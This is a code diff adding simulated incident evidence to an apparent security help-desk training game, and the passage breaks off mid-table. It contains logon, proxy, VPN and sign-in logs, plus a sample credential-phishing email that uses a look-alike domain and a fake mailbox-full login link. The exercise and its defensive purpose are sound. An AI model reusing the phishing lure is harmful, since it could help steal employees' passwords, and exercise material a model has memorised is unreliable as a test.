@@ -10569,6 +10569,4167 @@ const TICKET_BANK = [
     desc:'The web proxy logged host ENG-14 uploading 6.8 GB of encrypted .7z archives to mega[.]nz-style storage between 03:50-04:08 — outside business hours and far above this host normal outbound baseline. The same host earlier had the DLP/USB alert (TCK-2005). Determine whether this is exfiltration tied to the broader incident or a separate event, decide whether to block the destination and isolate the host, and outline what leadership/legal notification may be required for potential data loss.' },
 ];
 
+const TICKET_LOGS = {
+"TCK-1001": [
+{
+"name": "Domain Controller DC01 — Security Log",
+"type": "table",
+"guide": "Windows Security events from the domain controller, filtered to Fri 08-14 through Mon 08-18 morning. Key Event IDs: 4624 = successful logon, 4625 = failed logon, 4740 = account locked out, 4723 = user changed own password, 4634 = logoff. Logon Type 2 = someone typing at the keyboard of that computer; Type 3 = over the network; Type 7 = unlocking the screen. The \"Workstation\" and \"Source IP\" columns tell you WHERE the attempt came from. Tip: filter on the user name.",
+"cols": [
+"Time",
+"Event ID",
+"Account",
+"Workstation",
+"Source IP",
+"Logon Type",
+"Result"
+],
+"rows": [
+[
+"2026-08-14 16:52:10",
+"4723",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"—",
+"Password change by user — Success"
+],
+[
+"2026-08-14 16:52:31",
+"4624",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-14 17:31:02",
+"4634",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"2 (Interactive)",
+"Logoff"
+],
+[
+"2026-08-18 07:02:35",
+"4625",
+"p.nguyen",
+"ENG-09",
+"10.20.30.9",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 07:02:44",
+"4624",
+"p.nguyen",
+"ENG-09",
+"10.20.30.9",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 07:04:52",
+"4624",
+"t.becker",
+"ENG-14",
+"10.20.30.14",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-18 07:09:05",
+"4624",
+"t.becker",
+"ENG-14",
+"10.20.30.14",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-18 07:09:26",
+"4624",
+"s.morales",
+"ACCT-05",
+"10.20.14.55",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 07:13:49",
+"4625",
+"s.morales",
+"ACCT-05",
+"10.20.14.55",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 07:13:58",
+"4624",
+"s.morales",
+"ACCT-05",
+"10.20.14.55",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 07:31:53",
+"4624",
+"g.palmer",
+"EXEC-01",
+"10.20.10.11",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 07:34:07",
+"4624",
+"n.brooks",
+"PLANT-PC-07",
+"10.40.2.57",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-18 07:36:03",
+"4624",
+"b.kim",
+"ENG-03",
+"10.20.30.3",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 07:36:37",
+"4624",
+"s.morales",
+"ACCT-05",
+"10.20.14.55",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 07:37:36",
+"4624",
+"s.morales",
+"ACCT-05",
+"10.20.14.55",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 07:46:44",
+"4624",
+"k.tran",
+"MKT-04",
+"10.20.16.44",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 07:50:11",
+"4624",
+"c.wu",
+"ENG-11",
+"10.20.30.11",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 07:53:05",
+"4624",
+"t.becker",
+"ENG-14",
+"10.20.30.14",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-18 07:58:12",
+"4625",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 07:58:32",
+"4625",
+"j.owens",
+"HR-02",
+"10.20.18.12",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 07:58:40",
+"4625",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 07:58:41",
+"4624",
+"j.owens",
+"HR-02",
+"10.20.18.12",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 07:59:15",
+"4625",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 08:01:03",
+"4625",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 08:03:47",
+"4625",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 08:03:52",
+"4625",
+"m.hall",
+"SALES-11",
+"10.20.16.31",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 08:03:59",
+"4624",
+"m.hall",
+"SALES-11",
+"10.20.16.31",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 08:06:20",
+"4625",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 08:06:20",
+"4740",
+"dana.reyes",
+"FINANCE-07",
+"10.20.14.37",
+"—",
+"Account locked out (Caller Computer: FINANCE-07)"
+],
+[
+"2026-08-18 08:09:59",
+"4624",
+"a.singh",
+"FINANCE-03",
+"10.20.14.23",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 08:21:44",
+"4624",
+"r.castillo",
+"SALES-06",
+"10.20.16.26",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 08:22:10",
+"4624",
+"c.wu",
+"ENG-11",
+"10.20.30.11",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 08:25:35",
+"4624",
+"n.brooks",
+"PLANT-PC-07",
+"10.40.2.57",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 08:25:58",
+"4624",
+"k.tran",
+"MKT-04",
+"10.20.16.44",
+"3 (Network)",
+"Success"
+],
+[
+"2026-08-18 08:26:04",
+"4625",
+"m.hall",
+"SALES-11",
+"10.20.16.31",
+"2 (Interactive)",
+"Failure — 0xC000006A bad password"
+],
+[
+"2026-08-18 08:26:13",
+"4624",
+"m.hall",
+"SALES-11",
+"10.20.16.31",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 08:29:37",
+"4624",
+"s.morales",
+"ACCT-05",
+"10.20.14.55",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-18 08:33:31",
+"4624",
+"e.foster",
+"HR-05",
+"10.20.18.15",
+"2 (Interactive)",
+"Success"
+],
+[
+"2026-08-18 08:38:04",
+"4624",
+"c.wu",
+"ENG-11",
+"10.20.30.11",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-18 08:45:24",
+"4624",
+"k.tran",
+"MKT-04",
+"10.20.16.44",
+"7 (Unlock)",
+"Success"
+],
+[
+"2026-08-18 08:45:26",
+"4624",
+"k.tran",
+"MKT-04",
+"10.20.16.44",
+"7 (Unlock)",
+"Success"
+]
+]
+},
+{
+"name": "Employee Directory",
+"type": "kv",
+"guide": "HR directory record. Use the contact details ON FILE to verify the caller — not contact details given in the ticket or email.",
+"rows": [
+[
+"Employee ID",
+"4471"
+],
+[
+"Name",
+"Dana Reyes"
+],
+[
+"Username",
+"dana.reyes (display: d.reyes)"
+],
+[
+"Department",
+"Accounting — Payroll"
+],
+[
+"Manager",
+"Amanda Singh"
+],
+[
+"Desk phone",
+"x2214"
+],
+[
+"Mobile on file",
+"(314) 555-0186"
+],
+[
+"Assigned computer",
+"FINANCE-07 (10.20.14.37)"
+],
+[
+"Help-desk verification",
+"Call back on number on file + last 4 of employee ID"
+]
+]
+}
+],
+"TCK-1002": [
+{
+"name": "Reported Email — Full Headers",
+"type": "text",
+"guide": "Raw headers of the reported message. Compare the From domain to the real company domain (cedarcreek-ind.com). SPF \"pass\" only proves the sending server is allowed to send for THAT domain — an attacker who owns a look-alike domain can pass SPF. DKIM / DMARC \"none\" means the message is not signed and the domain has no policy.",
+"text": "Return-Path: <bounce-7731@mail.cedercreek-secure.com>\nReceived: from mail.cedercreek-secure.com (mail.cedercreek-secure.com [185.234.72.19])\n        by mx1.cedarcreek-ind.com with ESMTPS id 4Rt7Kq2xYz\n        for <h.patel@cedarcreek-ind.com>; Mon, 18 Aug 2026 08:42:11 -0500\nAuthentication-Results: mx1.cedarcreek-ind.com;\n        spf=pass (sender IP is 185.234.72.19) smtp.mailfrom=mail.cedercreek-secure.com;\n        dkim=none (message not signed);\n        dmarc=none action=none header.from=cedercreek-secure.com\nFrom: \"IT Support\" <support@cedercreek-secure.com>\nReply-To: \"IT Support\" <support@cedercreek-secure.com>\nTo: h.patel@cedarcreek-ind.com\nSubject: ACTION REQUIRED: Your mailbox is full - re-validate within 24 hours\nDate: Mon, 18 Aug 2026 13:42:05 +0000\nMessage-ID: <20260818134205.4471@mail.cedercreek-secure.com>\nX-Mailer: PHPMailer 6.8.1\nContent-Type: text/html; charset=\"UTF-8\"\n\n[Body] Your mailbox has reached 99% of its storage limit. To avoid losing\naccess, re-validate your account within 24 hours:\n    [ RE-VALIDATE NOW ] -> http://mailbox-verify.cedercreek-secure.com/login\nIT Support Team"
+},
+{
+"name": "Mail Gateway — Message Trace (08:00–09:30)",
+"type": "table",
+"guide": "Every message delivered in the window. Filter on the sender address to find everyone who received the same phish.",
+"cols": [
+"Time",
+"Sender",
+"Recipient",
+"Subject",
+"Status"
+],
+"rows": [
+[
+"2026-08-18 08:01:50",
+"orders@acme-supply.com",
+"c.wu@cedarcreek-ind.com",
+"Order confirmation #88213",
+"Delivered"
+],
+[
+"2026-08-18 08:03:12",
+"g.palmer@cedarcreek-ind.com",
+"c.wu@cedarcreek-ind.com",
+"RE: Q3 forecast",
+"Delivered"
+],
+[
+"2026-08-18 08:04:55",
+"g.palmer@cedarcreek-ind.com",
+"b.kim@cedarcreek-ind.com",
+"Lunch Friday?",
+"Delivered"
+],
+[
+"2026-08-18 08:05:09",
+"c.wu@cedarcreek-ind.com",
+"c.wu@cedarcreek-ind.com",
+"RE: Q3 forecast",
+"Delivered"
+],
+[
+"2026-08-18 08:07:21",
+"t.becker@cedarcreek-ind.com",
+"n.brooks@cedarcreek-ind.com",
+"Meeting notes",
+"Delivered"
+],
+[
+"2026-08-18 08:09:44",
+"dana.reyes@cedarcreek-ind.com",
+"t.becker@cedarcreek-ind.com",
+"Meeting notes",
+"Delivered"
+],
+[
+"2026-08-18 08:12:33",
+"orders@acme-supply.com",
+"b.kim@cedarcreek-ind.com",
+"Meeting reminder",
+"Delivered"
+],
+[
+"2026-08-18 08:22:38",
+"e.foster@cedarcreek-ind.com",
+"m.hall@cedarcreek-ind.com",
+"Updated timesheet",
+"Delivered"
+],
+[
+"2026-08-18 08:23:05",
+"news@industryweekly.com",
+"g.palmer@cedarcreek-ind.com",
+"Weekly digest",
+"Delivered"
+],
+[
+"2026-08-18 08:25:25",
+"l.osei@cedarcreek-ind.com",
+"n.brooks@cedarcreek-ind.com",
+"FW: Vendor contact",
+"Delivered"
+],
+[
+"2026-08-18 08:36:09",
+"l.osei@cedarcreek-ind.com",
+"g.palmer@cedarcreek-ind.com",
+"Meeting notes",
+"Delivered"
+],
+[
+"2026-08-18 08:42:11",
+"support@cedercreek-secure.com",
+"h.patel@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:14",
+"support@cedercreek-secure.com",
+"m.hall@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:17",
+"support@cedercreek-secure.com",
+"k.tran@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:20",
+"support@cedercreek-secure.com",
+"r.castillo@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:23",
+"support@cedercreek-secure.com",
+"s.morales@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:26",
+"support@cedercreek-secure.com",
+"b.kim@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:29",
+"support@cedercreek-secure.com",
+"e.foster@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:32",
+"support@cedercreek-secure.com",
+"n.brooks@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:35",
+"support@cedercreek-secure.com",
+"c.wu@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:38",
+"support@cedercreek-secure.com",
+"p.nguyen@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:41",
+"support@cedercreek-secure.com",
+"a.singh@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:42:44",
+"support@cedercreek-secure.com",
+"j.owens@cedarcreek-ind.com",
+"ACTION REQUIRED: Your mailbox is full...",
+"Delivered"
+],
+[
+"2026-08-18 08:44:38",
+"orders@acme-supply.com",
+"n.brooks@cedarcreek-ind.com",
+"Meeting reminder",
+"Delivered"
+],
+[
+"2026-08-18 08:44:54",
+"b.kim@cedarcreek-ind.com",
+"s.morales@cedarcreek-ind.com",
+"Meeting notes",
+"Delivered"
+],
+[
+"2026-08-18 08:44:54",
+"dana.reyes@cedarcreek-ind.com",
+"j.owens@cedarcreek-ind.com",
+"Updated timesheet",
+"Delivered"
+],
+[
+"2026-08-18 08:49:14",
+"b.kim@cedarcreek-ind.com",
+"k.tran@cedarcreek-ind.com",
+"Meeting notes",
+"Delivered"
+],
+[
+"2026-08-18 08:51:15",
+"s.morales@cedarcreek-ind.com",
+"p.nguyen@cedarcreek-ind.com",
+"FW: Vendor contact",
+"Delivered"
+],
+[
+"2026-08-18 08:53:44",
+"s.morales@cedarcreek-ind.com",
+"r.castillo@cedarcreek-ind.com",
+"Lunch Friday?",
+"Delivered"
+],
+[
+"2026-08-18 08:54:31",
+"c.wu@cedarcreek-ind.com",
+"g.palmer@cedarcreek-ind.com",
+"FW: Vendor contact",
+"Delivered"
+]
+]
+},
+{
+"name": "Web Proxy Log (08:00–10:00)",
+"type": "table",
+"guide": "Outbound web requests. GET = the page was opened. A POST to a login page would mean someone submitted the form (typed a password). Filter on the phishing domain.",
+"cols": [
+"Time",
+"User",
+"Source IP",
+"Destination Host",
+"Request",
+"HTTP",
+"Action",
+"Category"
+],
+"rows": [
+[
+"2026-08-18 08:09:30",
+"m.hall",
+"10.20.16.31",
+"cedarcreek.sharepoint.com",
+"GET",
+"200",
+"Allowed",
+"Business"
+],
+[
+"2026-08-18 08:15:12",
+"g.palmer",
+"10.20.10.11",
+"portal.acme-supply.com",
+"GET",
+"200",
+"Allowed",
+"Business"
+],
+[
+"2026-08-18 08:18:32",
+"r.castillo",
+"10.20.16.26",
+"teams.microsoft.com",
+"GET",
+"200",
+"Allowed",
+"Collaboration"
+],
+[
+"2026-08-18 08:21:13",
+"c.wu",
+"10.20.30.11",
+"www.google.com",
+"GET",
+"200",
+"Allowed",
+"Business"
+],
+[
+"2026-08-18 08:30:56",
+"e.foster",
+"10.20.18.15",
+"teams.microsoft.com",
+"GET",
+"200",
+"Allowed",
+"News"
+],
+[
+"2026-08-18 08:37:57",
+"dana.reyes",
+"10.20.14.37",
+"www.google.com",
+"GET",
+"200",
+"Allowed",
+"Search"
+],
+[
+"2026-08-18 08:44:17",
+"s.morales",
+"10.20.14.55",
+"www.google.com",
+"GET",
+"200",
+"Allowed",
+"News"
+],
+[
+"2026-08-18 08:46:10",
+"e.foster",
+"10.20.18.15",
+"teams.microsoft.com",
+"GET",
+"200",
+"Allowed",
+"Search"
+],
+[
+"2026-08-18 08:51:46",
+"s.morales",
+"10.20.14.55",
+"www.google.com",
+"GET",
+"200",
+"Allowed",
+"News"
+],
+[
+"2026-08-18 08:51:46",
+"dana.reyes",
+"10.20.14.37",
+"weather.com",
+"GET",
+"200",
+"Allowed",
+"Business"
+],
+[
+"2026-08-18 08:55:28",
+"m.hall",
+"10.20.16.31",
+"teams.microsoft.com",
+"GET",
+"200",
+"Allowed",
+"Business"
+],
+[
+"2026-08-18 08:57:31",
+"k.tran",
+"10.20.16.44",
+"mailbox-verify.cedercreek-secure.com",
+"GET /login",
+"200",
+"Allowed",
+"Newly Registered Domain"
+],
+[
+"2026-08-18 08:57:33",
+"k.tran",
+"10.20.16.44",
+"mailbox-verify.cedercreek-secure.com",
+"GET /assets/o365.css",
+"200",
+"Allowed",
+"Newly Registered Domain"
+],
+[
+"2026-08-18 09:09:35",
+"c.wu",
+"10.20.30.11",
+"cedarcreek.sharepoint.com",
+"GET",
+"200",
+"Allowed",
+"Search"
+],
+[
+"2026-08-18 09:35:01",
+"g.palmer",
+"10.20.10.11",
+"outlook.office365.com",
+"GET",
+"200",
+"Allowed",
+"News"
+],
+[
+"2026-08-18 09:43:33",
+"l.osei",
+"10.20.14.41",
+"cedarcreek.sharepoint.com",
+"GET",
+"200",
+"Allowed",
+"News"
+],
+[
+"2026-08-18 09:51:41",
+"c.wu",
+"10.20.30.11",
+"outlook.office365.com",
+"GET",
+"200",
+"Allowed",
+"Business"
+],
+[
+"2026-08-18 09:52:58",
+"n.brooks",
+"10.40.2.57",
+"cedarcreek.sharepoint.com",
+"GET",
+"200",
+"Allowed",
+"Search"
+],
+[
+"2026-08-18 09:53:08",
+"r.castillo",
+"10.20.16.26",
+"outlook.office365.com",
+"GET",
+"200",
+"Allowed",
+"Collaboration"
+],
+[
+"2026-08-18 09:55:12",
+"m.hall",
+"10.20.16.31",
+"teams.microsoft.com",
+"GET",
+"200",
+"Allowed",
+"Business"
+]
+]
+},
+{
+"name": "URL / Domain Lookup",
+"type": "kv",
+"guide": "Results from a URL scanner and WHOIS lookup on the link in the email (never open suspicious links on your own machine).",
+"rows": [
+[
+"URL",
+"http://mailbox-verify.cedercreek-secure.com/login"
+],
+[
+"Page title",
+"Sign in to your account — Microsoft 365"
+],
+[
+"Form action",
+"POST /login.php  (sends username + password to the attacker server)"
+],
+[
+"Hosting IP",
+"185.234.72.19 (same as the sending mail server)"
+],
+[
+"Domain registered",
+"2026-08-16 (2 days before the email)"
+],
+[
+"Registrar privacy",
+"Enabled"
+],
+[
+"Scanner verdict",
+"Malicious — credential phishing (Microsoft 365 brand)"
+]
+]
+}
+],
+"TCK-1003": [
+{
+"name": "VPN Gateway Log",
+"type": "table",
+"guide": "Every VPN connection attempt. The Result column gives the exact reason a connection failed — this is what turns a guess into a root cause. Filter on the user name and compare yesterday (worked) to today (fails).",
+"cols": [
+"Time",
+"User",
+"Client Public IP",
+"Result",
+"Assigned VPN IP"
+],
+"rows": [
+[
+"2026-08-17 14:03:22",
+"m.hall",
+"73.44.118.20",
+"Auth success — cert OK, MFA approved",
+"10.99.0.41"
+],
+[
+"2026-08-17 16:48:05",
+"m.hall",
+"73.44.118.20",
+"Session ended (user disconnect)",
+"—"
+],
+[
+"2026-08-18 07:21:35",
+"c.wu",
+"98.238.235.70",
+"Auth success — cert OK, MFA approved",
+"10.99.0.69"
+],
+[
+"2026-08-18 07:27:04",
+"s.morales",
+"67.172.78.202",
+"Auth success — cert OK, MFA approved",
+"10.99.0.37"
+],
+[
+"2026-08-18 07:33:45",
+"r.castillo",
+"67.241.29.250",
+"Auth success — cert OK, MFA approved",
+"10.99.0.40"
+],
+[
+"2026-08-18 07:38:54",
+"e.foster",
+"67.18.68.222",
+"Auth success — cert OK, MFA approved",
+"10.99.0.37"
+],
+[
+"2026-08-18 07:44:33",
+"b.kim",
+"73.237.144.230",
+"Auth success — cert OK, MFA approved",
+"10.99.0.90"
+],
+[
+"2026-08-18 07:45:27",
+"r.castillo",
+"108.104.87.109",
+"Auth success — cert OK, MFA approved",
+"10.99.0.42"
+],
+[
+"2026-08-18 07:47:06",
+"c.wu",
+"98.227.125.43",
+"Auth success — cert OK, MFA approved",
+"10.99.0.72"
+],
+[
+"2026-08-18 07:58:50",
+"h.patel",
+"67.249.225.28",
+"Auth success — cert OK, MFA approved",
+"10.99.0.35"
+],
+[
+"2026-08-18 08:02:57",
+"e.foster",
+"67.70.194.35",
+"Auth success — cert OK, MFA approved",
+"10.99.0.82"
+],
+[
+"2026-08-18 08:05:46",
+"e.foster",
+"73.5.87.143",
+"Auth success — cert OK, MFA approved",
+"10.99.0.59"
+],
+[
+"2026-08-18 08:08:26",
+"r.castillo",
+"24.101.114.82",
+"Auth success — cert OK, MFA approved",
+"10.99.0.34"
+],
+[
+"2026-08-18 08:44:20",
+"b.kim",
+"24.72.15.206",
+"Auth success — cert OK, MFA approved",
+"10.99.0.74"
+],
+[
+"2026-08-18 08:57:04",
+"r.castillo",
+"73.241.5.164",
+"Auth success — cert OK, MFA approved",
+"10.99.0.35"
+],
+[
+"2026-08-18 09:01:24",
+"c.wu",
+"73.133.160.77",
+"Auth success — cert OK, MFA approved",
+"10.99.0.62"
+],
+[
+"2026-08-18 09:12:40",
+"m.hall",
+"73.44.118.20",
+"Auth failed — client certificate expired (notAfter 2026-08-17 23:59:59 UTC)",
+"—"
+],
+[
+"2026-08-18 09:15:02",
+"m.hall",
+"73.44.118.20",
+"Auth failed — client certificate expired (notAfter 2026-08-17 23:59:59 UTC)",
+"—"
+],
+[
+"2026-08-18 09:22:51",
+"m.hall",
+"73.44.118.20",
+"Auth failed — client certificate expired (notAfter 2026-08-17 23:59:59 UTC)",
+"—"
+],
+[
+"2026-08-18 09:41:42",
+"r.castillo",
+"73.37.65.228",
+"Auth success — cert OK, MFA approved",
+"10.99.0.38"
+],
+[
+"2026-08-18 09:52:16",
+"c.wu",
+"98.39.138.237",
+"Auth success — cert OK, MFA approved",
+"10.99.0.62"
+]
+]
+},
+{
+"name": "Entra ID (Microsoft 365) Sign-ins — m.hall",
+"type": "table",
+"guide": "Cloud sign-ins for the user. A success here proves the account password is correct and the account is not locked.",
+"cols": [
+"Time",
+"App",
+"Client IP",
+"Location",
+"Result"
+],
+"rows": [
+[
+"2026-08-18 08:55:13",
+"Outlook Web",
+"73.44.118.20",
+"Kirkwood, MO",
+"Success (MFA approved)"
+],
+[
+"2026-08-18 09:30:44",
+"Outlook Web",
+"73.44.118.20",
+"Kirkwood, MO",
+"Success (token)"
+]
+]
+},
+{
+"name": "Account & Certificate Status — m.hall",
+"type": "kv",
+"guide": "Account properties from Active Directory and the user certificate from the internal Certificate Authority.",
+"rows": [
+[
+"Account locked",
+"No"
+],
+[
+"Account enabled",
+"Yes"
+],
+[
+"Password last set",
+"2026-07-30"
+],
+[
+"Password expires",
+"2026-10-28"
+],
+[
+"Groups",
+"Sales, VPN-Users, VPN-MFA-Users"
+],
+[
+"VPN client certificate",
+"CN=m.hall, issued by CedarCreek-Issuing-CA"
+],
+[
+"Certificate valid from",
+"2025-08-18 00:00:00 UTC"
+],
+[
+"Certificate valid to",
+"2026-08-17 23:59:59 UTC"
+],
+[
+"Auto-renewal",
+"Failed 2026-08-10 (laptop was off the network)"
+]
+]
+}
+],
+"TCK-1004": [
+{
+"name": "HR System — New Hire Record",
+"type": "kv",
+"guide": "Use this to confirm the request is real before creating anything.",
+"rows": [
+[
+"Name",
+"Priya Nair"
+],
+[
+"Employee ID",
+"4719"
+],
+[
+"Title",
+"Mechanical Engineer I"
+],
+[
+"Department",
+"Engineering"
+],
+[
+"Manager",
+"Tom Becker (t.becker)"
+],
+[
+"Start date",
+"Mon 2026-08-24"
+],
+[
+"Status",
+"Offer accepted — background check cleared 2026-08-12"
+],
+[
+"Work location",
+"HQ, 2nd floor"
+]
+]
+},
+{
+"name": "Asset & License Inventory",
+"type": "table",
+"guide": "Hardware and software assigned or available for the new hire.",
+"cols": [
+"Item",
+"Detail",
+"Status"
+],
+"rows": [
+[
+"Laptop LT-ENG-22",
+"Imaged 2026-08-14, Windows 11 23H2",
+"3 security updates pending"
+],
+[
+"AutoCAD 2026 license",
+"25 seats owned, 23 assigned",
+"2 available"
+],
+[
+"VPN client",
+"Standard image package",
+"Not installed"
+],
+[
+"MFA enrollment",
+"Requires user on day one",
+"Not started"
+],
+[
+"AD account p.nair",
+"—",
+"Not created"
+]
+]
+},
+{
+"name": "Access Groups & Approvals",
+"type": "table",
+"guide": "Groups that grant the requested access, who owns them, and approvals already recorded in the ticket system.",
+"cols": [
+"Group",
+"Grants",
+"Owner / approver",
+"Approval on file for p.nair?"
+],
+"rows": [
+[
+"SG-Engineering-Share-RW",
+"Read/write to \\\\fileserver\\Engineering",
+"Tom Becker (Eng. Manager)",
+"No"
+],
+[
+"APP-AutoCAD-Users",
+"AutoCAD license assignment",
+"IT Software Asset Mgmt",
+"No"
+],
+[
+"VPN-Users + VPN-MFA-Users",
+"Remote access with MFA",
+"IT Security",
+"No"
+],
+[
+"Engineering (dept. group)",
+"Department email lists, Teams",
+"HR (automatic)",
+"Yes — HR request"
+]
+]
+}
+],
+"TCK-1005": [
+{
+"name": "Entra ID Sign-in Log (10:00–11:05)",
+"type": "table",
+"guide": "Cloud sign-ins. Error 50126 = wrong password (no MFA prompt is sent). \"Password OK — MFA push sent\" means the CORRECT password was entered, so the device that did it knows the current password. Look at which IP / device produced the failures vs. the MFA prompts.",
+"cols": [
+"Time",
+"User",
+"Client IP",
+"App",
+"Device",
+"Result"
+],
+"rows": [
+[
+"2026-08-18 08:31:55",
+"l.osei",
+"10.20.14.41",
+"Windows Sign-in",
+"FINANCE-11",
+"Success"
+],
+[
+"2026-08-18 10:00:01",
+"dana.reyes",
+"10.20.14.37",
+"Teams",
+"FINANCE-07",
+"Success"
+],
+[
+"2026-08-18 10:11:12",
+"dana.reyes",
+"10.20.14.37",
+"Outlook",
+"FINANCE-07",
+"Success"
+],
+[
+"2026-08-18 10:15:59",
+"s.morales",
+"10.20.14.55",
+"Outlook",
+"ACCT-05",
+"Success"
+],
+[
+"2026-08-18 10:18:28",
+"dana.reyes",
+"10.20.14.37",
+"Teams",
+"FINANCE-07",
+"Success"
+],
+[
+"2026-08-18 10:22:03",
+"s.morales",
+"10.20.14.55",
+"Windows Sign-in",
+"ACCT-05",
+"Success"
+],
+[
+"2026-08-18 10:22:51",
+"s.morales",
+"10.20.14.55",
+"Windows Sign-in",
+"ACCT-05",
+"Success"
+],
+[
+"2026-08-18 10:40:47",
+"a.singh",
+"10.20.14.23",
+"Outlook",
+"FINANCE-03",
+"Success"
+],
+[
+"2026-08-18 10:42:31",
+"a.singh",
+"10.20.14.23",
+"Teams",
+"FINANCE-03",
+"Success"
+],
+[
+"2026-08-18 10:44:13",
+"g.palmer",
+"10.20.10.11",
+"Windows Sign-in",
+"EXEC-01",
+"Success"
+],
+[
+"2026-08-18 10:51:02",
+"l.osei",
+"10.20.14.88",
+"Exchange ActiveSync",
+"FIN-LT-09",
+"Failure — 50126 invalid username or password"
+],
+[
+"2026-08-18 10:52:40",
+"l.osei",
+"10.20.14.88",
+"Exchange ActiveSync",
+"FIN-LT-09",
+"Failure — 50126 invalid username or password"
+],
+[
+"2026-08-18 10:53:11",
+"l.osei",
+"10.20.14.103",
+"Outlook Mobile (iOS)",
+"iPhone-LOsei",
+"Password OK — MFA push sent — denied by user"
+],
+[
+"2026-08-18 10:53:56",
+"dana.reyes",
+"10.20.14.37",
+"Teams",
+"FINANCE-07",
+"Success"
+],
+[
+"2026-08-18 10:54:15",
+"l.osei",
+"10.20.14.88",
+"Exchange ActiveSync",
+"FIN-LT-09",
+"Failure — 50126 invalid username or password"
+],
+[
+"2026-08-18 10:55:51",
+"l.osei",
+"10.20.14.88",
+"Exchange ActiveSync",
+"FIN-LT-09",
+"Failure — 50126 invalid username or password"
+],
+[
+"2026-08-18 10:56:48",
+"l.osei",
+"10.20.14.103",
+"Outlook Mobile (iOS)",
+"iPhone-LOsei",
+"Password OK — MFA push sent — denied by user"
+],
+[
+"2026-08-18 10:57:30",
+"l.osei",
+"10.20.14.88",
+"Exchange ActiveSync",
+"FIN-LT-09",
+"Failure — 50126 invalid username or password"
+],
+[
+"2026-08-18 10:59:04",
+"l.osei",
+"10.20.14.88",
+"Exchange ActiveSync",
+"FIN-LT-09",
+"Failure — 50126 invalid username or password"
+],
+[
+"2026-08-18 11:00:20",
+"l.osei",
+"10.20.14.103",
+"Outlook Mobile (iOS)",
+"iPhone-LOsei",
+"Password OK — MFA push sent — timed out"
+]
+]
+},
+{
+"name": "DHCP Leases — 10.20.14.0/24",
+"type": "table",
+"guide": "Maps internal IP addresses to the device that held them. Use it to turn an IP from the sign-in log into a real device and owner.",
+"cols": [
+"IP",
+"Hostname",
+"MAC",
+"Asset record",
+"Lease start"
+],
+"rows": [
+[
+"10.20.14.41",
+"FINANCE-11",
+"3C:52:82:1A:77:09",
+"Workstation — assigned l.osei (current)",
+"2026-08-18 07:40"
+],
+[
+"10.20.14.88",
+"FIN-LT-09",
+"A4:BB:6D:02:5E:31",
